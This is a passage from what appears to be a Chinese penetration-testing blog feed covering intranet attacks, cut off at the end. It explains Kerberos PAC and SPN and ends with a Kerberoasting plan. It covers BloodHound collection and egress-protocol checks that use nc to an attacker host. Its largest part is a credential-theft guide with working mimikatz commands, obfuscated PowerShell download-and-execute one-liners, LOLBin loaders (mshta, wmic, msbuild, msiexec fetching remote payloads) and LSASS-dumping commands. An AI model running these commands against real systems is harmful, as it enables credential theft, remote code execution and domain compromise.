title="4.PAC"></a>4.PAC</h3><p>在Kerberos最初设计的几个流程里说明了如何证明client 是client而不是由其他人来冒充的，但并没有声明client有没有访问Server服务的权限，因为在域中不同权限的用户能够访问的资源是有区别的。<br>所以微软为了解决这个问题在实现 Kerberos 时加入了PAC的概念，PAC的全称是<strong>PrivilegeAttribute Certificate(特权属性证书)<strong>。可以理解为火车有一等座，也有二等座，而</strong>PAC就是为了区别不同权限的一种方式。</strong></p><h4 id="1-PAC的实现"><a href="#1-PAC的实现" class="headerlink" title="(1)PAC的实现"></a>(1)PAC的实现</h4><p>当用户与KDC之间完成了认证过程之后，Client需要访问Server所提供的某项服务时，Server为了判断用户是否具有合法的权限需要将client 的 User SID等信息传递给KDC,KDC通过SID判断用户的用户组信息，用户权限等，进而将结果返回给Server，Server再将此信息与用户所索取的资源的ACL进行比较，最后决定是否给用户提供相应的服务。<br>PAC会在 KRB_AS_REP中AS 放在TGT里加密发送给Client，然后由Client转发给TGS来验证Client所请求的服务。<br>在PAC中包含有两个数字签名PAC_SERVER_CHECKSuM和PAC_PRIVSVR_CHECKSUM，这两个数字签名分别由Server端密码HASH和KDC的密码HASH加密。<br>同时TGS解密之后验证签名是否正确，然后再重新构造新的PAC放在ST里返回给客户端，客户端将ST发送给服务端进行验证。</p><h4 id="2-Server-与-KDC"><a href="#2-Server-与-KDC" class="headerlink" title="(2)Server 与 KDC"></a>(2)Server 与 KDC</h4><p>PAC可以理解为一串校验信息，为了防止被伪造和串改，原则上是存放在TGT里，并且TGT由KDC hash加密。<strong>同时尾部会有两个数字签名，分别由KDC密码和server密码加密，防止数字签名内容被篡改</strong></p><p><img src="image-20210202022906946.png" alt="image-20210202022906946"></p><p>同时 PAC指定了固定的User SID和Groups ID，还有其他一些时间等信息，Server的程序收到ST之后解密得到PAC 会将PAC的数字签名发送给KDC，KDC再进行校验然后将结果已RPC返回码的形式返回给Server.</p><p><img src="image-20210202022957560.png" alt="image-20210202022957560"></p><h3 id="5-SPN"><a href="#5-SPN" class="headerlink" title="5.SPN"></a>5.SPN</h3><h4 id="1-SPN定义"><a href="#1-SPN定义" class="headerlink" title="1.SPN定义"></a>1.SPN定义</h4><p>服务主体名称( SPN )是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必预具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN.</p><p>全称Service Principal Names</p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN<br>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p><p>当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下</p><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><h4 id="2-SPN格式"><a href="#2-SPN格式" class="headerlink" title="2.SPN格式"></a>2.SPN格式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">servicelass/host:port/servicename</span><br><span class="line"># serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNSHOST等</span><br><span class="line"># host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</span><br><span class="line"># 如果服务运行在默认端口上，则端口号(port)可以省略</span><br></pre></td></tr></table></figure><p><img src="image-20210202023344004.png" alt="image-20210202023344004"></p><h4 id="3-查询SPN"><a href="#3-查询SPN" class="headerlink" title="3.查询SPN"></a>3.查询SPN</h4><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测<br>1、使用SetSPN<br>Win7和Windows Server2008自带的工具</p><p>查看当前域内的所有SPN：<code>setspn.exe -q */*</code></p><p><img src="image-20210202023724091.png" alt="image-20210202023724091"></p><p>查看指定的域：<code>setspn.exe -T test -q */*</code></p><p><img src="image-20210202023857881.png" alt="image-20210202023857881"></p><p>2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系这里举一个例子:<br>用户a要访问MySQL服务的资源，进行到4.tgs_reply时，步骤如下:</p><p>(1)Domain Controller查询MySQL服务的SPN<br>如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户<br>如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</p><p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p><p>3、域内的主机都能查询SPN</p><p>4、域内的任何用户都可以向域内的任何服务请求TGs</p><p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解<br>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p><p><strong>因此，高效率的利用思路如下:</strong></p><p>1.查询SPN，找到有价值的SPN，需要满足以下条件:<br>    1.该SPN注册在域用户帐户(Users)下<br>    2.域用户账户的权限很高</p><p>2.请求TGS</p><p>3.导出TGS</p><p>4.暴力破解</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kerberos介绍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bloodhound+sharphound</title>
      <link href="/2020/10/09/bloodhound-sharphound/"/>
      <url>/2020/10/09/bloodhound-sharphound/</url>
      
        <content type="html"><![CDATA[<p>本文介绍域内一神器的简单安装和使用</p><span id="more"></span><p><strong>sharphound</strong>：<a href="https://github.com/BloodHoundAD/SharpHound3">https://github.com/BloodHoundAD/SharpHound3</a></p><p>使用sharphound将目标及的域信息打包下来。</p><p>可将sharphound集成到cs中，方便一点</p><p><img src="1.png" alt="1"></p><p><img src="2.png" alt="2"></p><p>用插件将其数据打包，会生成一个zip文件</p><p><img src="3.png" alt="3"></p><p>然后用cs将其下载到本地</p><p><img src="4.png" alt="4"></p><p><img src="5.png" alt="5"><br>后面只需将压缩包上传到bloodhound分析即可。</p><p><strong>bloodhound安装</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update  </span><br><span class="line">apt-get dist-upgrade#软件包更新</span><br><span class="line">apt-get install bloodhound#下载安装bloodhound</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo4j start</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure><p>启动后，账户密码默认是Neo4j</p><p><img src="6.png" alt="6"></p><p>不过第一次登录会提示你到浏览器修改密码，初次登录默认账户密码都是neo4j，修改成功后，再登录bloodhound，账户任然是neo4j，密码是新密码(记录一下我的是neo4j123)</p><p>使用上传数据的功能将zi包解压后的jsv文件上传，之后会自动分析。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>出网协议判断</title>
      <link href="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/"/>
      <url>/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/</url>
      
        <content type="html"><![CDATA[<p>本文介绍常见几种出网协议的判断方法以及一款工具bloodhound</p><span id="more"></span><p>常见的出网协议有tcp、dns、http、icmp</p><h3 id="1-tcp协议"><a href="#1-tcp协议" class="headerlink" title="1.tcp协议"></a>1.tcp协议</h3><p>在目标机上传一个nc，攻击机监听：<code>nc -lvp 4444</code></p><p><img src="image-20210201144513817.png" alt="image-20210201144513817"></p><p>目标机执行，连接攻击机：<code>nc 192.168.43.30 4444</code></p><p><img src="image-20210201144536584.png" alt="image-20210201144536584"></p><p>攻击机连接成功，代表目标可以tcp协议出网</p><p><img src="image-20210201144609089.png" alt="image-20210201144609089"></p><h3 id="2-dns协议"><a href="#2-dns协议" class="headerlink" title="2.dns协议"></a>2.dns协议</h3><p>攻击机开启监听53端口：<code>nc -u -lvp 53</code></p><p><img src="image-20210201144713874.png" alt="image-20210201144713874"></p><p>目标执行：<code>nslookup [www.baidu.com](http://www.baidu.com) vps-ip  </code>(linux使用：<code>dig @vps-ip www.baidu.com</code>)</p><p><img src="image-20210201144938517.png" alt="image-20210201144938517"></p><p>攻击机连接成功，说明目标可以dns出网</p><p><img src="image-20210201145007065.png" alt="image-20210201145007065"></p><h3 id="3-http协议"><a href="#3-http协议" class="headerlink" title="3.http协议"></a>3.http协议</h3><p>攻击机监听80端口：<code>nc -lvp 80</code></p><p><img src="image-20210201145103774.png" alt="image-20210201145103774"></p><p>目标及访问攻击机ip：<code>curl vps-ip:80</code>（低版本的Windows直接访问：<code>vps-ip:80</code>）</p><p><img src="image-20210201145304735.png" alt="image-20210201145304735"></p><p>攻击机得到http请求，目标及可以http协议出网</p><p><img src="image-20210201145319587.png" alt="image-20210201145319587"></p><h3 id="4-icmp协议"><a href="#4-icmp协议" class="headerlink" title="4.icmp协议"></a>4.icmp协议</h3><p>目标机ping外网机器，若能成功，代表可以icmp出网</p><p><img src="image-20210201145406077.png" alt="image-20210201145406077"></p><p>.</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag>     - tcp、dns、http、icmp出网协议判断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码抓取</title>
      <link href="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
      <url>/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>本文介绍几种抓取密码的工具以及一些高版本操作系统绕过方式。</p><span id="more"></span><p>攻击机：kali：192.168.43.30</p><p>客户机：win7：192.168.43.78</p><p>客户机DC：win2012：192.168.43.211</p><p>下列有关在win7上没有复现成功的，在win2008上复现成功，没有贴图。</p><h2 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1.mimikatz"></a>1.mimikatz</h2><p>github项目：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><h3 id="1-可执行程序使用"><a href="#1-可执行程序使用" class="headerlink" title="1.可执行程序使用"></a>1.可执行程序使用</h3><p>分为32位和64位的架构程序，配有动态链接库和sys文件，在目标机器中应该将这两个文件均传上去。</p><p><img src="image-20210131165644837.png" alt="image-20210131165644837"></p><p>一些简单的用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CRYPTO::Certificates-列出/导出凭证。</span><br><span class="line">KERBEROS::Golden -创建黄金票证/白银票证/信任票证。</span><br><span class="line">KERBEROS::List/export -列出/导出在用户的内存中所有用户的票证(TGT 和TGS)。</span><br><span class="line">KERBEROS::PTT -票证传递。</span><br><span class="line">LSADUMP::DCSync -向DC发起同步一个对象（获取帐户的密码数据)的质询。</span><br><span class="line">LSADUMP::LSA -向LSA Server质询检索SAM/AD 的数据（正常或未打补丁的情况下),导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgt</span><br><span class="line">LSADUMP::SAM - 获取 SysKey来解密SAM 的项目数据（从注册表或者 hive 中导出)，SAM选项连接到本地安全帐户管理器(SAM)数据库，并能转储本地帐户的凭证。可以用来转储windows计算机上的所有的本地凭据。</span><br><span class="line">LSADUMP::Trust-向LSA Server质询来获取信任的认证信息（正常或未打补丁的情况），转储所有关联的信任(域/林)的信任密钥(密码).</span><br><span class="line">MISC::AddSid - 将用户帐户添加到SID历史记录。第一个值是目标帐户，第二值是帐户/组名称(或SID).移至SID：自2016年5月6日起修改.</span><br><span class="line">MISC::MemSSP - 注入恶意的 wndows SSP来记录本地身份验证凭据。</span><br><span class="line">MISC::Skeleton -在DC 中注入万能钥匙( Skeleton Key)到LSASS进程中。这使所有用户对经过Skeleton Key修补的DC的身份验证都可以使用&quot;主密码&quot;(也称为Skeleton Key)以及其通常的密码.</span><br><span class="line">PRIVILEGE::Debug - 获得Debug 权限(此命令前提需要administer权限，很多Mimikatz命令需要Debug 权限或&quot;本地系统&quot;权限).</span><br><span class="line">SEKURLSA::Ekeys -列出 Kerberos密钥</span><br><span class="line">SEKURLSA::Kerberos -列出所有已通过认证的用户的 Kerberos 凭证(包括服务帐户和计算机帐户)的Kerberos凭据</span><br><span class="line">SEKURLSA::Krbtgt -获取域中Kerberos服务帐户(KRBTGT)的密码数据。</span><br><span class="line">SEKURLSA::LogonPasswords -列出所有可用的提供者的凭据。列出明文密码，但win2012之后不行，系统不会保存为明文密码</span><br><span class="line">SEKURLSA::Pth -Hash传递和Key传递(注:Over-Pass-the-Hash 的实际过程就是key传递）</span><br><span class="line">SEKURLSA::Tickets -列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户的上下文中运行的服务.与kerberos::list不同，sekurlsa使用内存读取，并且不受密钥导出限制.sekurlsa可以访问其他会话(用户)的票证.</span><br><span class="line">TOKEN::List –列出系统的所有令牌</span><br><span class="line">TOKEN::Elevate -假冒令牌。用于提升权限至SYSTEM 权限（默认情况下)或者是发现域管理员令牌</span><br><span class="line">TOKEN::Elevate /domainadmin - 假冒一个拥有域管理员凭证的令牌。</span><br></pre></td></tr></table></figure><h3 id="2-msf加载mimikatz"><a href="#2-msf加载mimikatz" class="headerlink" title="2.msf加载mimikatz"></a>2.msf加载mimikatz</h3><p>先利用木马反弹一个会话，以下操作均是在msf5下完成，不同版本命令有差异。</p><p>加载mimikatz：<code>load mimikatz</code></p><p><img src="image-20210131174013325.png" alt="image-20210131174013325"></p><p><code>wdigest</code>列出目标的明文密码，更低版本Windows能直接列出来</p><p><img src="image-20210131175535662.png" alt="image-20210131175535662"></p><p><code>tspkg</code>：需要system权限，尝试列出目标明文密码，不一定成功</p><p><img src="image-20210131175845116.png" alt="image-20210131175845116"></p><p><code>msv</code>：抓取密码的hash</p><p><img src="image-20210131175903296.png" alt="image-20210131175903296"></p><p><code>mimikatz_command -f </code>：自定义命令，使用mimikatz可执行程序的命令，例如抓取明文密码</p><p><img src="image-20210131180210948.png" alt="image-20210131180210948"></p><p><img src="image-20210131180405356.png" alt="image-20210131180405356"></p><h3 id="3-cs加载mimikatz"><a href="#3-cs加载mimikatz" class="headerlink" title="3.cs加载mimikatz"></a>3.cs加载mimikatz</h3><p>利用木马得到一个会话后，开启mimikatz</p><p><img src="image-20210131181030025.png" alt="image-20210131181030025"></p><p>开启后，会默认抓取目标主机明文密码</p><p><img src="image-20210131181108775.png" alt="image-20210131181108775"></p><p>cs抓取后的信息均可以在凭证获取</p><p><img src="image-20210131181306677.png" alt="image-20210131181306677"></p><p>Hashdump-抓取密码的hash</p><p><img src="image-20210131181555323.png" alt="image-20210131181555323"></p><h3 id="4-powershell版mimikatz"><a href="#4-powershell版mimikatz" class="headerlink" title="4.powershell版mimikatz"></a>4.powershell版mimikatz</h3><p>powershell地址： <a href="https://github.com/DanMcInerney/Invoke-Cats">https://github.com/DanMcInerney/Invoke-Cats</a></p><h4 id="1-落地执行"><a href="#1-落地执行" class="headerlink" title="1.落地执行"></a>1.落地执行</h4><p>导入模块：<code>Import-Module .\Invoke-Cats.ps1</code></p><p><img src="image-20210131182614968.png" alt="image-20210131182614968"></p><p>执行命令：<code>Invoke-Cats -pwds</code></p><p><img src="image-20210131182705563.png" alt="image-20210131182705563"></p><h4 id="2-内存执行，远程加载"><a href="#2-内存执行，远程加载" class="headerlink" title="2.内存执行，远程加载"></a>2.内存执行，远程加载</h4><p><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadingString(powershell_adress);Invoke-Cats -pwds&quot;</code></p><p>这个脚本执行出错不知道为啥。。。</p><p>另外一个版本powershell：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a></p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.0.101/Invoke-ReflectivePEInjection.ps1&#x27;);Invoke-ReflectivePEInjection -PEUrl http://192.168.0.101/mimikatz.exe -ExeArgs &quot;sekurlsa::logonpasswords&quot; -ForceASLR</span><br></pre></td></tr></table></figure><h4 id="3-混淆后远程加载"><a href="#3-混淆后远程加载" class="headerlink" title="3.混淆后远程加载"></a>3.混淆后远程加载</h4><p><code>powershell -c &quot; (&#39;IEX &#39;+&#39;(Ne&#39;+&#39;w-O&#39;+bject Ne&#39;+&#39;t.W&#39;+&#39;ebClien&#39;+&#39;t).Do&#39;+&#39;wnloadingS&#39;+&#39;trin&#39;+&#39;g&#39;+&#39;(&#39;+&#39;1vchttp://&#39;+&#39;192.168.1&#39;+&#39;.101/&#39;+&#39;Inv&#39;+&#39;oke-Mimik&#39;+&#39;a&#39;+&#39;tz.&#39;+&#39;ps11v&#39;+&#39;c)&#39;+&#39;;&#39;+&#39;I&#39;+&#39;nvoke-Mimika&#39;+&#39;tz&#39;).REplaCE(&#39;1vc&#39;,[STRing][CHAR]39)|IeX&quot;</code></p><h3 id="5-NET2-0加载mimikatz"><a href="#5-NET2-0加载mimikatz" class="headerlink" title="5 .NET2.0加载mimikatz"></a>5 .NET2.0加载mimikatz</h3><p>mimikatz.cs：<a href="https://gist.githubusercontent.com/nicholasmckinney/896b508b6cf1e8c3e567ccab29c8d3ec/raw/afa7219adbfcdfc160c163273ef8ec61ff0658b4/katz.cs">https://gist.githubusercontent.com/nicholasmckinney/896b508b6cf1e8c3e567ccab29c8d3ec/raw/afa7219adbfcdfc160c163273ef8ec61ff0658b4/katz.cs</a></p><p>将katz.cs放置于C:\Windows\Microsoft.NET\Framework\v2.0.50727</p><p>在powershell下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$key = &#x27;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line">Set-Contentkey.snk -Value $Content -EncodingByte</span><br></pre></td></tr></table></figure><p>​    </p><p>然后cmd执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe</span><br></pre></td></tr></table></figure><p>没复现成功。</p><h3 id="6-js加载mimikatz"><a href="#6-js加载mimikatz" class="headerlink" title="6.js加载mimikatz"></a>6.js加载mimikatz</h3><p>shell地址：<a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></p><p>mimikatz.js：<a href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js</a></p><p>直接执行：<code>cscript mimikatz.js</code></p><p>但是已经过不了杀软，绕过方法参考：<a href="https://evi1cg.me/archives/AMSl_bypass.html">https://evi1cg.me/archives/AMSl_bypass.html</a></p><p>没有找到js文件</p><h3 id="7-msiexec加载mimikatz"><a href="#7-msiexec加载mimikatz" class="headerlink" title="7.msiexec加载mimikatz"></a>7.msiexec加载mimikatz</h3><p>mimikatz.mi：<a href="https://github.com/homjxi0e/PowerScript/blob/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi">https://github.com/homjxi0e/PowerScript/blob/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi</a></p><p>远程执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS:&gt; msiexec.exe /passive /i https://github.com/homjxi0e/PowerScript/raw/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi /norestartcmd:&gt; msiexec.exe /passive /i https://github.com/homjxi0e/PowerScript/raw/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi /norestart</span><br></pre></td></tr></table></figure><p>cmd执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /passive /i C:\Users\Administrator\Downloads\Mimikatz.msi</span><br></pre></td></tr></table></figure><p>没有找到msi文件</p><h3 id="8-NET4-0加载mimikatz"><a href="#8-NET4-0加载mimikatz" class="headerlink" title="8..NET4.0加载mimikatz"></a>8..NET4.0加载mimikatz</h3><p>mimikatz.xml：<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml</a></p><p>cmd执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319</span><br><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure><p>加载mimikatz成功</p><p><img src="image-20210201142952835.png" alt="image-20210201142952835"></p><h3 id="9-xsl加载mimikatz"><a href="#9-xsl加载mimikatz" class="headerlink" title="9.xsl加载mimikatz"></a>9.xsl加载mimikatz</h3><p>mimikatz.xsl:<a href="https://gist.githubusercontent.com/manasmbellani/7f3e39170f5bc8e3a493c62b80e69427/raw/87550d0fc03023bab99ad83ced657b9ef272a3b2/mimikatz.xsl">https://gist.githubusercontent.com/manasmbellani/7f3e39170f5bc8e3a493c62b80e69427/raw/87550d0fc03023bab99ad83ced657b9ef272a3b2/mimikatz.xsl</a></p><p>本地执行：<code>wmic os get /format:&quot;mimikatz.xsl&quot;</code></p><p><img src="image-20210201143133124.png" alt="image-20210201143133124"></p><p>远程加载：<code>wmic os get /format:&quot;http://127.0.0.1/mimikatz.xsl&quot;</code></p><h3 id="10-sct加载mimikatz"><a href="#10-sct加载mimikatz" class="headerlink" title="10.sct加载mimikatz"></a>10.sct加载mimikatz</h3><p>mimikatz.sct：https:&#x2F;gist.github.com&#x2F;caseysmithrc&#x2F;3fe7a8330a74b303562eb494d47e79c5&#x2F;raw&#x2F;9336891fc81ac71bfff3c8fd4a8816dead30964e&#x2F;mimikatz.sct</p><p>cmd执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe javascript:a=GetObject(&quot;script:https://gist.github.com/caseysmithrc/3fe7a8330a74b303562eb494d47e79c5/raw/9336891fc81ac71bfff3c8fd4a8816dead30964e/mimikatz.sct&quot;).Exec(); log coffee exit</span><br></pre></td></tr></table></figure><p>没有找到sct文件</p><h2 id="2-windows下常见的抓取hash工具"><a href="#2-windows下常见的抓取hash工具" class="headerlink" title="2..windows下常见的抓取hash工具"></a>2..windows下常见的抓取hash工具</h2><p>工具下载： <a href="https://github.com/TheKingOfDuck/hashdump">https://github.com/TheKingOfDuck/hashdump</a></p><h3 id="1-QuarksPwDump"><a href="#1-QuarksPwDump" class="headerlink" title="1.QuarksPwDump"></a>1.QuarksPwDump</h3><p>直接在cmd下启动程序，会显示出所支持的用法</p><p><img src="image-20210131195407858.png" alt="image-20210131195407858"></p><p>执行<code>QuarksPwDump.exe -dha</code></p><p><img src="image-20210131195708977.png" alt="image-20210131195708977"></p><h3 id="2-wce"><a href="#2-wce" class="headerlink" title="2.wce"></a>2.wce</h3><p>执行<code>wce.exe -w</code></p><p><img src="image-20210131204114432.png" alt="image-20210131204114432"></p><h3 id="3-pwdump7"><a href="#3-pwdump7" class="headerlink" title="3.pwdump7"></a>3.pwdump7</h3><p>有一个依赖文件，经常报错，不推荐</p><p><img src="image-20210131204415490.png" alt="image-20210131204415490"></p><p>将抓取到的hash解ntlm</p><p><img src="image-20210131204448558.png" alt="image-20210131204448558"></p><h3 id="4-LaZagne"><a href="#4-LaZagne" class="headerlink" title="4.LaZagne"></a>4.LaZagne</h3><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><p>支持浏览器、数据库等等很多，但是由python编写，文件比较大</p><p>获取所有密码：<code>laZagne.exe all</code></p><p><img src="image-20210131210014659.png" alt="image-20210131210014659"></p><p>只获取浏览器记住的密码：<code>laZagne.exe browsers</code></p><p>只获取firefox记住的密码：<code>laZagne.exe browsers -firefox</code></p><p>将输出保存到文件：<code>laZagne.exe all -oN</code></p><p>执行完该命令后会发现当前目录下多了一个文件，文件名类似：<code>credentials_23042019_225124.txt</code></p><p>还可以加参数-output指定输出到哪个目录，如：<code>laZagne.exe all -quiet -oA -output C:\Users\Werner\Desktop</code></p><p>若是知道用户密码，可以用参数-password输入，这样就可能解密出更多明文密码，如：<code>laZagne.exe all -password P@5sw0rd</code></p><h3 id="5-sharpdump"><a href="#5-sharpdump" class="headerlink" title="5.sharpdump"></a>5.sharpdump</h3><p><a href="https://github.com/GhostPack/SharpDump">https://github.com/GhostPack/SharpDump</a></p><p>转储LSASS：</p><p><img src="image-20210131212129367.png" alt="image-20210131212129367"></p><p>在结果中给出了一种结合mimikatz的用法，但是需要手都转储lsass进程</p><p><img src="image-20210131220949255.png" alt="image-20210131220949255"></p><p>将转储文件拿出来用mimikatz解出密码，在mimikatz中依次执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.DMP</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><p><img src="image-20210131221357423.png" alt="image-20210131221357423"></p><p>另外一种用法转储特定的进程ID：<code>SharpDump.exe 8700</code></p><h3 id="6-procdump"><a href="#6-procdump" class="headerlink" title="6.procdump"></a>6.procdump</h3><p>cmd下执行：<code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p><p><img src="image-20210131221744431.png" alt="image-20210131221744431"></p><p>这款工具也是直接dump下lsass进程，后续解密和sharpdump解密一样放在mimikatz中</p><h3 id="7-sqldumper"><a href="#7-sqldumper" class="headerlink" title="7.sqldumper"></a>7.sqldumper</h3><p>微软自己家的东西,如果目标安装了mssql，可以通过sqldumper.exe来dump lsass进程，没安装也可以手动上传。 sqldumper的默认路径：C:\Program Files\Microsoft SQL Server\110\Shared</p><p>cmd下执行：<code>for /f &quot;tokens=2&quot; %i in(&#39;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; .NH&#39;) do sqldumper.exe %i 0 0x01100</code></p><p>这种方法没做出来，不过可以分开来</p><p>1.先找到lsass.exe的进程id:<code>tasklist|findstr &quot;lsass.exe&quot;</code></p><p>2.导出dmp文件：<code>sqldumper.exe &lt;pid&gt; 0 0x01100</code></p><p>也报错，你妈的佛了。。。</p><h3 id="8-rundll32"><a href="#8-rundll32" class="headerlink" title="8.rundll32"></a>8.rundll32</h3><p>微软自己家的东西</p><p>cmd下执行：<code>for /f &quot;tokens=2&quot; %i in(&#39;tasklist /FI 